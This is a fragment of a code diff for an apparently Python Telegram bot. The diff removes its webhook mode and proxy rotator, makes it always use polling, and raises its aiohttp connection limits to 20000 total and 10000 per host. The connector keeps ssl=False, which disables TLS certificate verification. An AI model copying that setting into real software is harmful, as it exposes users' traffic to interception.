-    webhook_path = f"/webhook/{BOT_TOKEN}"
-
-    async def telegram_webhook(request):
-        try:
-            json_str = await request.text()
-            update   = Update.de_json(json_str)
-            await bot.process_new_updates([update])
-        except Exception as e:
-            print(f"[Webhook] error: {e}")
-        return web.Response(text="OK")
-
-    async def health(request):
-        return web.Response(text="Bot is awake and running 24/7!")
-
-    app.router.add_post(webhook_path, telegram_webhook)
-    app.router.add_get('/', health)
-
-    runner = web.AppRunner(app)
-    await runner.setup()
-    port = int(os.environ.get('PORT', 8099))
-    site = web.TCPSite(runner, '0.0.0.0', port)
-    await site.start()
-    print(f"[Webhook] Listening on port {port}")
-
-    full_url = f"{WEBHOOK_URL}{webhook_path}"
-    try:
-        await bot.remove_webhook()
-        await asyncio.sleep(1)
-        await bot.set_webhook(url=full_url, drop_pending_updates=True)
-        print(f"[Webhook] Set: {full_url}")
-    except Exception as e:
-        print(f"[Webhook] Failed: {e}")
-        raise
-
-    asyncio.create_task(github_update_scheduler())
-    await asyncio.Event().wait()
 
 # ───────────────────────────────────────────────────────────
 # Main
 # ───────────────────────────────────────────────────────────
 async def main():
     global session, _connector
-
-    await proxy_rotator.initialize()
-
     _connector = aiohttp.TCPConnector(
-        limit=2000, limit_per_host=200,
+        limit=20000, limit_per_host=10000,
         ttl_dns_cache=300, ssl=False
     )
     session = aiohttp.ClientSession(
@@ -1299,24 +1133,12 @@ async def main():
         connector=_connector, connector_owner=False
     )
     try:
-        if WEBHOOK_URL:
-            print(f"[Main] WEBHOOK mode")
-            await run_webhook_mode()
-        else:
-            print("[Main] POLLING mode")
-            app    = web.Application()
-            app.router.add_get('/', handle)
-            runner = web.AppRunner(app)
-            await runner.setup()
-            port = int(os.environ.get('PORT', 8099))
-            site = web.TCPSite(runner, '0.0.0.0', port)
-            await site.start()
-            asyncio.create_task(github_update_scheduler())
-            await start_polling()
+        asyncio.create_task(web_server())
+        asyncio.create_task(github_update_scheduler())
+        await start_polling()
     finally:
         await session.close()
         await _connector.close()
-        await proxy_rotator.close()
 
 if __name__ == '__main__':
     asyncio.run(main())
